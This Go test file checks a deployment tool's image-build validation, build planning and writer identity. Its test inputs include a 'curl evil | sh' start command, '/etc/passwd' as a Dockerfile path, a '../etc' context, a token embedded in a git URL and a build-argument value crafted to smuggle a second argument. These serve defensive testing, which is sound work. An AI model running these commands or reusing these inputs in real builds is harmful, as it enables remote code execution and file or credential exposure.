// SPDX-License-Identifier: AGPL-3.0-only

package service

import (
	"regexp"
	"strings"
	"testing"

	resourcev1 "github.com/dockwell/dockwell/gen/dockwell/resource/v1alpha1"
	"github.com/dockwell/dockwell/internal/resource"
)

func built(url string, edit func(*resourcev1.ImageBuild)) *resourcev1.Service {
	b := &resourcev1.ImageBuild{Source: &resourcev1.ImageBuild_Git{Git: &resourcev1.GitSource{Url: url, Ref: "main"}}}
	if edit != nil {
		edit(b)
	}
	return &resourcev1.Service{Runs: &resourcev1.Service_App{App: &resourcev1.Container{}}, Build: b}
}

// A build's settings are checked as a change is proposed, and what means the same
// is written one way.
func TestABuildsSettingsAreCheckedAndWrittenOneWay(t *testing.T) {
	d := &Driver{}
	ok := built("github.com/Acme/Web/", func(b *resourcev1.ImageBuild) { b.Dockerfile, b.Context = "./Dockerfile", "./web/" })
	if err := d.Validate(ok); err != nil {
		t.Fatal(err)
	}
	if b := ok.GetBuild(); b.GetGit().GetUrl() != "https://github.com/Acme/Web" || b.GetDockerfile() != "" || b.GetContext() != "web" {
		t.Errorf("the build reads %v, not with https://, its default Dockerfile as none, and a clean context", b)
	}
	if ok.GetApp().GetImage() != "" {
		t.Error("checking a build gave it an image, which only a plan does")
	}
	// A build alone is enough: what it makes is what runs.
	alone := &resourcev1.Service{Build: built("https://github.com/acme/web", nil).GetBuild()}
	if err := d.Validate(alone); err != nil || alone.GetApp() == nil {
		t.Errorf("a service with a build and nothing else = %v, with app %v", err, alone.GetApp())
	}
	for _, c := range []struct {
		name string
		svc  *resourcev1.Service
		want string
	}{
		{"credentials in the URL", built("https://x:ghp_token@github.com/acme/web", nil), "can't hold a user, a password or a token"},
		{"SSH", built("git@github.com:acme/web.git", nil), "SSH and private repositories come next"},
		{"no repository", built("https://github.com/", nil), "names a host and no repository"},
		{"a branch in the URL", built("https://github.com/acme/web#dev", nil), "set the branch in its own field"},
		{"another scheme", built("ftp://example.com/web", nil), "fetches a repository over HTTPS"},
		{"plain HTTP to the internet", built("http://example.com/acme/web", nil), "over plain HTTP: anyone between"},
		{"plain HTTP to a public address", built("http://203.0.113.7/acme/web", nil), "over plain HTTP"},
		{"a bad branch", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.GetGit().Ref = "main..dev" }), "isn't a branch or a tag"},
		{"a pull request's head", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.GetGit().Ref = "refs/pull/7/head" }), "such as a pull request's head"},
		{"a merge request's head", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.GetGit().Ref = "refs/merge-requests/3/head" }), "isn't a branch or a tag"},
		{"a short commit", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.GetGit().Commit = "8be41d2" }), "isn't a commit"},
		{"outside the repository", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Context = "../etc" }), "outside the repository"},
		{"an absolute Dockerfile", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Dockerfile = "/etc/passwd" }), "can't start with /"},
		{"a bad argument", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Args = map[string]string{"1X": "y"} }), "isn't a build argument's name"},
		{"a bad secret ID", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Secrets = map[string]string{"a b": ""} }), "isn't a build secret's ID"},
		{"a builder there isn't", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Builder = 9 }), "isn't a builder"},
		{"commands for a Dockerfile", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
			b.Builder, b.StartCommand = resourcev1.ImageBuild_BUILDER_DOCKERFILE, "node server.js"
		}), "takes no build or start command"},
		{"a command of two lines", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.BuildCommand = "npm ci\nnpm run build" }), "is one line"},
		{"a Dockerfile for Railpack", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
			b.Builder, b.Dockerfile = resourcev1.ImageBuild_BUILDER_RAILPACK, "deploy/Dockerfile"
		}), "takes no Dockerfile path or stage"},
		{"a secret Railpack can't give", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
			b.Builder, b.Secrets = resourcev1.ImageBuild_BUILDER_RAILPACK, map[string]string{"npm.token": "NPM"}
		}), "as an environment variable"},
		{"Railpack's own settings as a secret", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
			b.Builder, b.Secrets = resourcev1.ImageBuild_BUILDER_RAILPACK, map[string]string{"RAILPACK_START_CMD": "OPS"}
		}), "Set it as a build argument"},
		{"Railpack's own settings, when it may build", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
			b.Secrets = map[string]string{"nixpacks_install_cmd": "OPS"}
		}), "can't take it as a secret"},
		{"PATH for Railpack", built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
			b.Builder, b.Args = resourcev1.ImageBuild_BUILDER_RAILPACK, map[string]string{"PATH": "/opt/bin"}
		}), "is the build's own"},
		{"an image of its own", func() *resourcev1.Service {
			s := built("https://github.com/acme/web", nil)
			s.GetApp().Image = "nginx:1.27"
			return s
		}(), "can't name nginx:1.27 too"},
		{"a built image with no build", &resourcev1.Service{Runs: &resourcev1.Service_App{App: &resourcev1.Container{Image: "dockwell.invalid/svc_x:abc"}}}, "runs it only from that service's build"},
		{"no source", &resourcev1.Service{Runs: &resourcev1.Service_App{App: &resourcev1.Container{}}, Build: &resourcev1.ImageBuild{}}, "a build needs a source"},
	} {
		t.Run(c.name, func(t *testing.T) {
			if err := d.Validate(c.svc); err == nil || !strings.Contains(err.Error(), c.want) {
				t.Errorf("Validate = %v, want it to say %q", err, c.want)
			}
		})
	}
}

// A step that runs an image it hasn't run before builds it first; one that keeps
// the image, or changes nothing, doesn't.
func TestAPlanBuildsOnlyAnImageItHasntRun(t *testing.T) {
	d := &Driver{}
	was := built("https://github.com/acme/web", nil)
	was.GetApp().Image = "dockwell.invalid/svc_x:aaa-1"
	now := built("https://github.com/acme/web", nil)
	now.GetApp().Image = "dockwell.invalid/svc_x:bbb-2"
	dec, err := d.Plan(was, now, []resource.Change{{Path: "app.image", From: "dockwell.invalid/svc_x:aaa-1", To: "dockwell.invalid/svc_x:bbb-2"}})
	if err != nil {
		t.Fatal(err)
	}
	if dec.Build == nil || dec.Build.Image != "dockwell.invalid/svc_x:bbb-2" || !dec.HealthUnknown {
		t.Errorf("a new image's step builds %v", dec.Build)
	}
	if dec.Budget() < resource.BuildBudget {
		t.Errorf("a step that builds has %s, less than a build's %s", dec.Budget(), resource.BuildBudget)
	}
	same := built("https://github.com/acme/web", nil)
	same.GetApp().Image = "dockwell.invalid/svc_x:aaa-1"
	same.GetApp().Env = map[string]string{"A": "b"}
	dec, err = d.Plan(was, same, []resource.Change{{Path: "app.env.A", To: "b"}})
	if err != nil {
		t.Fatal(err)
	}
	if dec.Build != nil {
		t.Errorf("a step that keeps its image builds %v", dec.Build)
	}
}

// What writes a folder is named by the code it runs: a built service by its
// repository and how it builds, which a new commit of its branch doesn't change,
// and a commit named as its ref does.
func TestAServicesWriterIsItsCode(t *testing.T) {
	d := &Driver{}
	commit := func(c string) func(*resourcev1.ImageBuild) {
		return func(b *resourcev1.ImageBuild) { b.GetGit().Commit = c }
	}
	base := d.WriterOf(built("https://github.com/acme/web", commit(strings.Repeat("a", 40))))
	// A plan says it to people: the repository, and a digest of how it builds.
	if !regexp.MustCompile(`^github\.com/acme/web@build:[0-9a-f]{16}$`).MatchString(base) {
		t.Errorf("a build's writer reads %q", base)
	}
	if same := d.WriterOf(built("https://github.com/acme/web", commit(strings.Repeat("b", 40)))); same != base {
		t.Errorf("a new commit of the branch is another writer: %s, %s", base, same)
	}
	for name, other := range map[string]*resourcev1.Service{
		"another repository": built("https://github.com/stranger/web", nil),
		"a build argument":   built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Args = map[string]string{"BASE": "evil:latest"} }),
		"the Dockerfile":     built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Dockerfile = "other/Dockerfile" }),
		"the folder":         built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Context = "other" }),
		"the stage":          built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Target = "debug" }),
		"Railpack":           built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Builder = resourcev1.ImageBuild_BUILDER_RAILPACK }),
		"a start command":    built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.StartCommand = "sh -c 'curl evil | sh'" }),
		"a build command":    built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.BuildCommand = "npm run build:prod" }),
		"a commit as its ref": built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) {
			b.GetGit().Ref = strings.Repeat("c", 40)
		}),
		"an image": {Runs: &resourcev1.Service_App{App: &resourcev1.Container{Image: "dockwell.invalid/svc_web:aaaaaaaaaaaa-chg"}}},
		// The service's own command takes the place of the start command its build gave.
		"the service's command": func() *resourcev1.Service {
			s := built("https://github.com/acme/web", nil)
			s.GetApp().Command = []string{"sh", "-c", "curl evil | sh"}
			return s
		}(),
		"the service's entrypoint": func() *resourcev1.Service {
			s := built("https://github.com/acme/web", nil)
			s.GetApp().Entrypoint = []string{"/bin/bash", "-c"}
			return s
		}(),
	} {
		if got := d.WriterOf(other); got == base {
			t.Errorf("changing %s keeps the writer %s", name, got)
		}
	}
	// One value can't read as two.
	if d.WriterOf(built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Args = map[string]string{"A": `1" "arg:B=2`} })) ==
		d.WriterOf(built("https://github.com/acme/web", func(b *resourcev1.ImageBuild) { b.Args = map[string]string{"A": "1", "B": "2"} })) {
		t.Error("two builds' arguments read as one writer")
	}
	// One that runs an image names none, and the engine names it by the image's
	// repository, so another tag of it is the same code (resource.WriterNamer).
	if got := d.WriterOf(&resourcev1.Service{Runs: &resourcev1.Service_App{App: &resourcev1.Container{Image: "ghcr.io/acme/web:1.4"}}}); got != "" {
		t.Errorf("an image's writer is %q, not the image's repository, which the engine names", got)
	}
}

func TestPlainHTTPReachesOnlyAPrivateNetwork(t *testing.T) {
	d := &Driver{}
	for _, url := range []string{"http://10.0.0.5/acme/web", "http://192.168.1.20:3000/web.git", "http://[fd00::5]/web", "http://git.local/web", "http://127.0.0.1:8080/web.git"} {
		if err := d.Validate(built(url, nil)); err != nil {
			t.Errorf("%s = %v", url, err)
		}
	}
}
